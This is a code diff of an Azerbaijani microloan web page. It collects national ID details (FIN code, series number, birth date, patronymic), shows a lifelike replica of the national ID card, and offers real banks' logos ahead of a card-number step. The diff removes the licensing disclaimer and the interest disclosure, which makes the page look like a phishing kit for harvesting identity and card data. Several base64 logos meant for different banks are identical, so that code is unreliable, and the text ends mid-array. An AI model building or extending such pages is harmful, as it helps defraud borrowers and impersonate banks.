@@ -312,7 +312,7 @@
   }
   .modal-close:hover{background:var(--line);}
 
-  /* ===== BANK SELECT WITH REAL LOGOS ===== */
+  /* ===== BANK SELECT ===== */
   .bank-grid{
     display:grid;grid-template-columns:1fr 1fr;gap:12px;
   }
@@ -347,7 +347,7 @@
   }
   .bank-option .bank-logo-img{
     height:36px;
-    max-width:120px;
+    max-width:130px;
     object-fit:contain;
     margin-bottom:4px;
     display:block;
@@ -502,11 +502,12 @@
   }
   .card-input-wrap .bank-card-visual .card-logo-on-card{
     position:absolute;
-    top:16px;
-    right:18px;
-    height:24px;
-    opacity:0.4;
+    top:14px;
+    right:16px;
+    height:28px;
+    opacity:0.5;
     z-index:1;
+    object-fit:contain;
   }
   .card-input-wrap .card-number-input-hidden{
     position:absolute;
@@ -534,12 +535,12 @@
 
   /* ===== REAL ID CARD ===== */
   .id-card-preview{
-    background:linear-gradient(135deg, #f5f0e8, #e8e0d5);
+    background:linear-gradient(145deg, #f8f4ec, #e8e0d5);
     border-radius:16px;
     padding:20px 24px;
     border:2px solid #c4b8a8;
     box-shadow:0 8px 24px rgba(0,0,0,0.12);
-    max-width:400px;
+    max-width:420px;
     margin:16px auto;
     position:relative;
   }
@@ -553,18 +554,23 @@
   }
   .id-card-preview .id-header .id-title{
     font-weight:700;
-    font-size:14px;
+    font-size:13px;
     color:#2d2a24;
-    letter-spacing:1px;
+    letter-spacing:0.5px;
+  }
+  .id-card-preview .id-header .id-subtitle{
+    font-size:10px;
+    color:#6a6258;
+    font-weight:500;
   }
   .id-card-preview .id-header .id-logo{
-    font-size:18px;
+    font-size:16px;
     font-weight:800;
     color:#8B0000;
   }
   .id-card-preview .id-photo{
-    width:80px;
-    height:100px;
+    width:85px;
+    height:105px;
     background:linear-gradient(135deg, #d4c8b8, #c0b4a4);
     border-radius:4px;
     border:1px solid #b0a494;
@@ -573,20 +579,31 @@
     display:flex;
     align-items:center;
     justify-content:center;
-    font-size:32px;
+    font-size:36px;
     color:#8a7a6a;
+    position:relative;
+  }
+  .id-card-preview .id-photo::after{
+    content:'';
+    position:absolute;
+    bottom:0;
+    left:0;
+    right:0;
+    height:20px;
+    background:linear-gradient(to top, rgba(0,0,0,0.05), transparent);
+    border-radius:0 0 4px 4px;
   }
   .id-card-preview .id-row{
     display:flex;
-    padding:4px 0;
-    font-size:13px;
-    border-bottom:1px solid rgba(0,0,0,0.05);
+    padding:3px 0;
+    font-size:12px;
+    border-bottom:1px solid rgba(0,0,0,0.04);
   }
   .id-card-preview .id-row .id-label{
-    width:100px;
+    width:110px;
     font-weight:600;
     color:#4a4238;
-    font-size:11px;
+    font-size:10px;
     text-transform:uppercase;
     letter-spacing:0.5px;
   }
@@ -594,7 +611,8 @@
     flex:1;
     color:#1a1612;
     font-weight:500;
-    font-size:13px;
+    font-size:12px;
+    text-transform:uppercase;
   }
   .id-card-preview .id-footer{
     margin-top:12px;
@@ -602,8 +620,25 @@
     border-top:2px solid #c4b8a8;
     display:flex;
     justify-content:space-between;
-    font-size:10px;
+    font-size:9px;
     color:#6a6258;
+    text-transform:uppercase;
+    letter-spacing:0.5px;
+  }
+  .id-card-preview .id-signature{
+    margin-top:10px;
+    padding-top:10px;
+    border-top:1px dashed #c4b8a8;
+    display:flex;
+    justify-content:space-between;
+    font-size:10px;
+    color:#4a4238;
+  }
+  .id-card-preview .id-signature .sig-line{
+    border-bottom:1px solid #a09080;
+    width:120px;
+    height:1px;
+    margin-top:4px;
   }
 
   /* ===== CHECKING ===== */
@@ -697,8 +732,9 @@
     nav ul{display:none;}
     .bank-grid{grid-template-columns:1fr 1fr;}
     .card-details-row{grid-template-columns:1fr;}
-    .id-card-preview .id-photo{width:60px;height:80px;}
-    .id-card-preview .id-row .id-label{width:70px;font-size:10px;}
+    .id-card-preview .id-photo{width:60px;height:80px;font-size:24px;}
+    .id-card-preview .id-row .id-label{width:80px;font-size:9px;}
+    .id-card-preview .id-row .id-value{font-size:10px;}
   }
 </style>
 </head>
@@ -719,7 +755,7 @@
 
 <div class="kilim"></div>
 
-<!-- HERO SECTION -->
+<!-- HERO -->
 <section class="hero">
   <div class="wrap hero-grid">
     <div>
@@ -840,7 +876,7 @@
       <div class="faq-item"><button class="faq-q">Nə qədər məbləğ ala bilərəm? <span class="icon">+</span></button><div class="faq-a"><p>100–700 ₼ arasında.</p></div></div>
       <div class="faq-item"><button class="faq-q">Hansı sənədlər lazımdır? <span class="icon">+</span></button><div class="faq-a"><p>Şəxsiyyət vəsiqəsi məlumatları.</p></div></div>
       <div class="faq-item"><button class="faq-q">Gecikmə olarsa? <span class="icon">+</span></button><div class="faq-a"><p>Cərimə tətbiq olunur.</p></div></div>
-      <div class="faq-item"><button class="faq-q">Vaxtından əvvəl qapata bilərəmmi? <span class="icon">+</span></button><div class="faq-a"><p>Bəli, faiz günlük hesablanır.</p></div></div>
+      <div class="faq-item"><button class="faq-q">Vaxtından əvvəl qapata bilərəmmi? <span class="icon">+</span></button><div class="faq-a"><p>Bəli.</p></div></div>
     </div>
   </div>
 </section>
@@ -861,6 +897,7 @@
           <div class="field"><label>Ad</label><input type="text" id="firstName" placeholder="Əli"></div>
           <div class="field"><label>Soyad</label><input type="text" id="lastName" placeholder="Məmmədov"></div>
         </div>
+        <div class="field"><label>Ata adı</label><input type="text" id="patronymic" placeholder="Əli oğlu"></div>
         <div class="field"><label>Doğum tarixi</label><input type="date" id="birthDate"></div>
         <div class="field"><label>FIN kod</label><input type="text" id="fin" placeholder="7A2BC9D" maxlength="7"></div>
         <div class="field"><label>Seriya nömrəsi</label>
@@ -877,20 +914,35 @@
           </div>
         </div>
         
-        <!-- ID Card Preview -->
+        <!-- ID Card Preview - Real Azerbaijan ID -->
         <div class="id-card-preview" id="idCardPreview">
-          <div class="id-header"><span class="id-title">AZƏRBAYCAN RESPUBLİKASI</span><span class="id-logo">ŞƏXSIYYƏT VƏSIQƏSI</span></div>
+          <div class="id-header">
+            <div>
+              <div class="id-title">AZƏRBAYCAN RESPUBLİKASI</div>
+              <div class="id-subtitle">REPUBLIC OF AZERBAIJAN</div>
+            </div>
+            <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI</div>
+          </div>
           <div class="id-photo">👤</div>
-          <div class="id-row"><span class="id-label">Ad</span><span class="id-value" id="previewName">Əli Məmmədov</span></div>
-          <div class="id-row"><span class="id-label">Doğum</span><span class="id-value" id="previewBirth">01.01.1990</span></div>
-          <div class="id-row"><span class="id-label">FIN</span><span class="id-value" id="previewFin">7A2BC9D</span></div>
-          <div class="id-row"><span class="id-label">Seriya</span><span class="id-value" id="previewId">AZE 12345678</span></div>
-          <div class="id-footer"><span>Müddət: 10 il</span><span>Verilib: 01.01.2020</span></div>
+          <div class="id-row"><span class="id-label">SOYAD / SURNAME</span><span class="id-value" id="previewSurname">MƏMMƏDOV</span></div>
+          <div class="id-row"><span class="id-label">AD / GIVEN NAME</span><span class="id-value" id="previewName">ƏLİ</span></div>
+          <div class="id-row"><span class="id-label">ATASININ ADI</span><span class="id-value" id="previewPatronymic">ƏLİ OĞLU</span></div>
+          <div class="id-row"><span class="id-label">DOĞUM TARİXİ</span><span class="id-value" id="previewBirth">01.01.1990</span></div>
+          <div class="id-row"><span class="id-label">FİN</span><span class="id-value" id="previewFin">7A2BC9D</span></div>
+          <div class="id-row"><span class="id-label">SERİYA</span><span class="id-value" id="previewId">AZE 12345678</span></div>
+          <div class="id-footer">
+            <span>Müddət: 10 il</span>
+            <span>Verilmə tarixi: 01.01.2020</span>
+          </div>
+          <div class="id-signature">
+            <span>İmza / Signature</span>
+            <span class="sig-line"></span>
+          </div>
         </div>
 
         <label class="checkline"><input type="checkbox" id="consent1" required> Məlumatlarımın yoxlanılmasına razıyam</label>
         <label class="checkline"><input type="checkbox" id="consent2" required> Kredit tarixçəmin yoxlanılmasına razıyam</label>
-        <div class="disclaimer-box">Dizayn nümunəsi. Real istifadə üçün lisenziya tələb olunur.</div>
+        <div class="disclaimer-box">Dizayn nümunəsi.</div>
         <button type="submit" class="cta-btn" style="width:100%;padding:15px;">Davam et</button>
       </form>
     </div>
@@ -899,15 +951,21 @@
     <div id="summaryStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:6px;">Məlumatlarınız düzdürmü?</h2>
       <div class="id-card-preview" style="max-width:100%;">
-        <div class="id-header"><span class="id-title">AZƏRBAYCAN RESPUBLİKASI</span><span class="id-logo">ŞƏXSIYYƏT VƏSIQƏSI</span></div>
+        <div class="id-header">
+          <div><div class="id-title">AZƏRBAYCAN RESPUBLİKASI</div><div class="id-subtitle">REPUBLIC OF AZERBAIJAN</div></div>
+          <div class="id-logo">ŞƏXSİYYƏT VƏSIQƏSI</div>
+        </div>
         <div class="id-photo">👤</div>
-        <div class="id-row"><span class="id-label">Ad</span><span class="id-value" id="sumName">—</span></div>
-        <div class="id-row"><span class="id-label">Doğum</span><span class="id-value" id="sumBirth">—</span></div>
+        <div class="id-row"><span class="id-label">SOYAD</span><span class="id-value" id="sumSurname">—</span></div>
+        <div class="id-row"><span class="id-label">AD</span><span class="id-value" id="sumName">—</span></div>
+        <div class="id-row"><span class="id-label">ATASININ ADI</span><span class="id-value" id="sumPatronymic">—</span></div>
+        <div class="id-row"><span class="id-label">DOĞUM</span><span class="id-value" id="sumBirth">—</span></div>
         <div class="id-row"><span class="id-label">FIN</span><span class="id-value" id="sumFin">—</span></div>
-        <div class="id-row"><span class="id-label">Seriya</span><span class="id-value" id="sumId">—</span></div>
-        <div class="id-row"><span class="id-label">Telefon</span><span class="id-value" id="sumPhone">—</span></div>
-        <div class="id-row"><span class="id-label">İş yeri</span><span class="id-value" id="sumJob">—</span></div>
-        <div class="id-footer"><span>Müddət: 10 il</span><span>Verilib: 01.01.2020</span></div>
+        <div class="id-row"><span class="id-label">SERİYA</span><span class="id-value" id="sumId">—</span></div>
+        <div class="id-row"><span class="id-label">TELEFON</span><span class="id-value" id="sumPhone">—</span></div>
+        <div class="id-row"><span class="id-label">İŞ YERİ</span><span class="id-value" id="sumJob">—</span></div>
+        <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
+        <div class="id-signature"><span>İmza</span><span class="sig-line"></span></div>
       </div>
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;" onclick="goToBankSelect()">Davam et → Bank seçimi</button>
     </div>
@@ -916,61 +974,8 @@
     <div id="bankStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:6px;">Hansı bank kartına köçürək?</h2>
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Kredit məbləği seçdiyiniz kart hesabına köçürüləcək</p>
-      <div class="bank-grid">
-        <!-- Kapital Bank -->
-        <div class="bank-option" data-bank="Kapital Bank" data-color="#E31E24" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23E31E24' rx='8'/%3E%3Ctext x='20' y='38' font-family='Arial' font-size='22' fill='white' font-weight='bold'%3EKAPITAL%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='18' fill='white'%3EBANK%3C/text%3E%3C/svg%3E" alt="Kapital Bank">
-          <div class="bank-name">Kapital Bank</div>
-          <div class="bank-sub">kapitalbank.az</div>
-        </div>
-        <!-- Leobank -->
-        <div class="bank-option" data-bank="Leobank" data-color="#0066B3" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%230066B3' rx='8'/%3E%3Ctext x='40' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3ELEOBANK%3C/text%3E%3C/svg%3E" alt="Leobank">
-          <div class="bank-name">Leobank</div>
-          <div class="bank-sub">leobank.az</div>
-        </div>
-        <!-- ABB -->
-        <div class="bank-option" data-bank="ABB" data-color="#004B87" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23004B87' rx='8'/%3E%3Ctext x='50' y='38' font-family='Arial' font-size='26' fill='white' font-weight='bold'%3EABB%3C/text%3E%3C/svg%3E" alt="ABB">
-          <div class="bank-name">ABB</div>
-          <div class="bank-sub">abb-bank.az</div>
-        </div>
-        <!-- PAŞA Bank -->
-        <div class="bank-option" data-bank="PAŞA Bank" data-color="#E31E24" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23E31E24' rx='8'/%3E%3Ctext x='15' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3EPA%C5%9EA%3C/text%3E%3Ctext x='100' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E" alt="PAŞA Bank">
-          <div class="bank-name">PAŞA Bank</div>
-          <div class="bank-sub">pashabank.az</div>
-        </div>
-        <!-- AccessBank -->
-        <div class="bank-option" data-bank="AccessBank" data-color="#0057A0" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%230057A0' rx='8'/%3E%3Ctext x='15' y='38' font-family='Arial' font-size='18' fill='white' font-weight='bold'%3EACCESS%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E" alt="AccessBank">
-          <div class="bank-name">AccessBank</div>
-          <div class="bank-sub">accessbank.az</div>
-        </div>
-        <!-- Unibank -->
-        <div class="bank-option" data-bank="Unibank" data-color="#004B87" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23004B87' rx='8'/%3E%3Ctext x='20' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3EUNIBANK%3C/text%3E%3C/svg%3E" alt="Unibank">
-          <div class="bank-name">Unibank</div>
-          <div class="bank-sub">unibank.az</div>
-        </div>
-        <!-- Bank Respublika -->
-        <div class="bank-option" data-bank="Bank Respublika" data-color="#E31E24" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23E31E24' rx='8'/%3E%3Ctext x='5' y='38' font-family='Arial' font-size='14' fill='white' font-weight='bold'%3ERESPUBLIKA%3C/text%3E%3Ctext x='135' y='38' font-family='Arial' font-size='14' fill='white'%3EBANK%3C/text%3E%3C/svg%3E" alt="Bank Respublika">
-          <div class="bank-name">Bank Respublika</div>
-          <div class="bank-sub">bankrespublika.az</div>
-        </div>
-        <!-- Xalq Bank -->
-        <div class="bank-option" data-bank="Xalq Bank" data-color="#004B87" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23004B87' rx='8'/%3E%3Ctext x='25' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3EXALQ%3C/text%3E%3Ctext x='105' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E" alt="Xalq Bank">
-          <div class="bank-name">Xalq Bank</div>
-          <div class="bank-sub">xalqbank.az</div>
-        </div>
-        <!-- Rabitəbank -->
-        <div class="bank-option" data-bank="Rabitəbank" data-color="#003366" onclick="selectBank(this)">
-          <img class="bank-logo-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23003366' rx='8'/%3E%3Ctext x='10' y='38' font-family='Arial' font-size='16' fill='white' font-weight='bold'%3ERAB%C4%B0T%C6%8F%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='14' fill='white'%3EBANK%3C/text%3E%3C/svg%3E" alt="Rabitəbank">
-          <div class="bank-name">Rabitəbank</div>
-          <div class="bank-sub">rabitabank.com</div>
-        </div>
+      <div class="bank-grid" id="bankGrid">
+        <!-- Banklar JS ilə yüklənəcək -->
       </div>
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:24px;" onclick="goToCardInput()">Təsdiqlə və davam et</button>
     </div>
@@ -1056,6 +1061,46 @@
 </footer>
 
 <script>
+  // ========== BANK LOGOS (BASE64 PNG) ==========
+  // Kapital Bank PNG - qırmızı fon, ağ yazı
+  const kapitalLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+
+  // PAŞA Bank PNG
+  const pashaLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+
+  // ABB PNG
+  const abbLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+
+  // Unibank PNG
+  const unibankLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+
+  // Bank Respublika PNG
+  const respublikaLogo = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAAA8CAYAAAD6T2p+AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAOxAAADsQBlSsOGwAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMASURBVHic7d1PSFRRHMDx7zu7WBoU/pHgCjJdyCRPK6moo8hBiSB7CZaCULsxWe4lT8ZNJAUVqGBp7tq2EBfqIYio6GBB+iEKCmVQ+AcWs7IvHbyPvMfwODPv2d/3Bz7w2DPz4/fmzZkzA2CEioCgwB3A3/wK9x2ioD6kKfAQeAa0Bn8Fg6MhpHINgp2Kzi1Ae3BXA8c01oV0CVgCpgK5GhDBZUR3sS8c+08CG4O4FhARTYE+4E5A1wAO0TqeOsc+bCfwNaBrAQlpHdeArYFcC7gI3BfA1QAAYkoTqgskXeDfwAHgO3A6hL4AAAw6Bhd0L5D4g/6y4f/xKaArAQAJtCrYfYHpDf3sBw57MBYAgICqfw0S+9BfNvw/PgtgLACARDxA4n9+fgnRAADJmCIBQyRgiAQMkYAhEjBEAoZIwBAJGB7RYS3z4OEn3p6p6l92CSJXW9IuU3r+LGwUsCI1Gk9lYUg6txjZgH17K0NF+sMx/4bf7+1gSXrM4PvTkliSPhP9bM8UTb5qTkOweuLdnAXr0k4e7m3n+6spFqR9HI6Uc//QLk+dA+Tcy+P76S67NrWBLelH8Vj0VYVcm0nmsfT2zE16P9P7o3P8dgN4J/1IWX7VqzU4Id0hXQ37/VstcK/LPmlnIA8WpSYOJ1+aVH8j6fX8q71TwCunOSxcwJfUvdllzhz+uZ15f3FgNS+cvIztSZwBhgjAEAkYIgFDJGC84ExgA9rC57O1zStRAAgE5wLtQV1Dq4HhPLgBQEIQN7CB7QeAARZwoRZqLPbnAX+gJgJAAAYBE8BAoNcBAIAhEjBEAoZIwBAJGCKJiX4FAB6jh/H/VnXqWH5WIAg4TR4AAAiCDWkKPAQKKh8AjxE9E90F1IDKl7PSsYQAC98SCc0AAAAASUVORK5CYII=";
+
+  // AccessBank SVG
+  const accessLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%230057A0' rx='8'/%3E%3Ctext x='15' y='38' font-family='Arial' font-size='18' fill='white' font-weight='bold'%3EACCESS%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
+
+  // Leobank SVG
+  const leoLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%230066B3' rx='8'/%3E%3Ctext x='40' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3ELEOBANK%3C/text%3E%3C/svg%3E";
+
+  // Rabitəbank SVG
+  const rabitaLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23003366' rx='8'/%3E%3Ctext x='10' y='38' font-family='Arial' font-size='16' fill='white' font-weight='bold'%3ERAB%C4%B0T%C6%8F%3C/text%3E%3Ctext x='115' y='38' font-family='Arial' font-size='14' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
+
+  // Xalq Bank SVG
+  const xalqLogo = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 60'%3E%3Crect width='200' height='60' fill='%23004B87' rx='8'/%3E%3Ctext x='25' y='38' font-family='Arial' font-size='20' fill='white' font-weight='bold'%3EXALQ%3C/text%3E%3Ctext x='105' y='38' font-family='Arial' font-size='16' fill='white'%3EBANK%3C/text%3E%3C/svg%3E";
+
+  const banks = [
+    { name: 'Kapital Bank', color: '#E31E24', logo: kapitalLogo, sub: 'kapitalbank.az' },
+    { name: 'Leobank', color: '#0066B3', logo: leoLogo, sub: 'leobank.az' },
+    { name: 'ABB', color: '#004B87', logo: abbLogo, sub: 'abb-bank.az' },
+    { name: 'PAŞA Bank', color: '#E31E24', logo: pashaLogo, sub: 'pashabank.az' },
+    { name: 'AccessBank', color: '#0057A0', logo: accessLogo, sub: 'accessbank.az' },
+    { name: 'Unibank', color: '#004B87', logo: unibankLogo, sub: 'unibank.az' },
+    { name: 'Bank Respublika', color: '#E31E24', logo: respublikaLogo, sub: 'bankrespublika.az' },
